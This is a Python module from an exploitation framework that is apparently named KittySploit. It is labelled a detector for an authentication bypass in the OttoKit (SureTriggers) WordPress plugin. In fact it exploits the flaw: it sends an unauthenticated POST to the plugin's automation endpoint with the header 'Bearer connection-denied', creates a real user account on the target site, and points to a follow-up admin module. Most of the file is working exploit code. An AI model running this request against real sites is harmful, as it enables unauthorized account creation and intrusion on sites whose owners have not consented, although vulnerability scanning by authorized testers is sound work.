#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OttoKit (SureTriggers) <= 1.1.40 connection-denied API secret bypass (CVE-2026-110372)."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "suretriggers"
_VULN_HIGH = (1, 1, 40)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "OttoKit CVE-2026-110372 connection-denied detect",
        "description": (
            "Detects CVE-2026-110372: when OttoKit stores secret 'connection-denied', "
            "st-authorization: Bearer connection-denied allows unauthenticated automation API user creation."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-110372",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-110372",
            "https://wpsec.com/vuln/WPSEC-2026-1053/",
        ],
        "modules": ["auxiliary/admin/http/ottokit_cve_2026_110372_connection_denied"],
        "tags": ["web", "scanner", "wordpress", "ottokit", "suretriggers", "cve-2026-110372"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "approval_required": True,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/ottokit_cve_2026_110372_connection_denied"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._base()) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        idx = self.http_request(method="GET", path=self._join("/wp-json/"), allow_redirects=True)
        if not idx or "sure-triggers" not in (idx.text or ""):
            return False
        user = f"ksprobe{secrets.token_hex(3)}"
        email = f"{user}@example.test"
        pwd = secrets.token_urlsafe(10)
        body = json.dumps(
            {
                "integration": "WordPress",
                "type_event": "create_user_if_not_exists",
                "selected_options": {
                    "user_name": user,
                    "user_email": email,
                    "password": pwd,
                    "first_name": "Probe",
                    "last_name": "Check",
                    "role": "subscriber",
                    "force_update_user_role": True,
                    "add_user_roles": True,
                    "show_password": True,
                },
            }
        )
        r = self.http_request(
            method="POST",
            path=self._join("/wp-json/sure-triggers/v1/automation/action"),
            headers={
                "Content-Type": "application/json",
                "st-authorization": "Bearer connection-denied",
            },
            data=body,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        text = r.text or ""
        if "rest_forbidden" in text or "rest_no_route" in text:
            return False
        if '"success":true' in text.replace(" ", "") or '"success": true' in text:
            if "user_login" in text or "user_registered" in text:
                self.set_info(
                    severity="critical",
                    reason="CVE-2026-110372 — automation API accepts Bearer connection-denied",
                    path="/wp-json/sure-triggers/v1/automation/action",
                    cve="CVE-2026-110372",
                )
                return True
        return False
